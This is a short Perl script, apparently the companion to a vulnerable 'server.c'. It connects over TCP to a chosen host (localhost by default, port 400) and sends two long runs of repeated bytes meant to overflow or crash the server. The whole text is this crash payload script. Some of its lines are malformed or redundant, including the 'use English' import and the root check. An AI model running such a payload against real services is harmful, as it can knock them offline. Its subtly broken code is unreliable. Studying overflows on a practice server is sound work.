# The script to go with the 'server.c' script  -  Simple

use strict;
use Socket;
use Term::ANSIColor;
use English -qw' -no_math_vars ';

# Variables
my $gs = "\e[32m";
my $ge = "\e[0m";
my $rs = "\e[31m";
my $re = "\e[0m";
my $ys = "\e[33m";
my $ye = "\e[0m";
my $osname = $^O;

# Clear the terminal
system("clear");

# Check if the user is running Windows
if ($osname eq 'MSWin32' or $osname eq 'win32') {
    die "$rs [-] $re Cannot run on Windows...";
    exit(1);
}

# Check if the user is in root
if ($< != 0 or $< == 1) {
    die "$rs [-] $re Must run this script in root...";
    exit(1);
}


# The one payload...
my $payload = "\x41" x2000;
my $other_payload = "\x51" x8000;

# Initialize host ('localhost') and set the port to '400'
my $host = shift || 'localhost';
my $port = shift || 400;
my $proto = getprotobyname('tcp');

# Get the port address
my $addr = inet_aton($host);
my $addr_2 = sockaddr_in($port, $addr);

# Print a message stating that the socket is being setup
print "$gs [+] $ge$ys Setting up socket...$ye\n";
# Create the socket and establish connection to the port
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "$ys Socket $ye: $rs $! $re";
# Attempt to connect to the port
print "$gs [+]$ge $ys Connecting to $gs $host $ge on port $gs $port $ge ...$ys\n";
connect(SOCKET, $addr_2) or die "$ys Connect $ye:$rs $! $re";
# Send the payload
print "$gs [+] $ge $ys Sending payload...$ye\n";
print SOCKET $payload."\n";
print "$gs [+] $ge $ys Payload [1] Sent...$ye";
print SOCKET $other_payload."\n";
print "$gs [+] $ge $ys Payload [2] Sent...$ye";
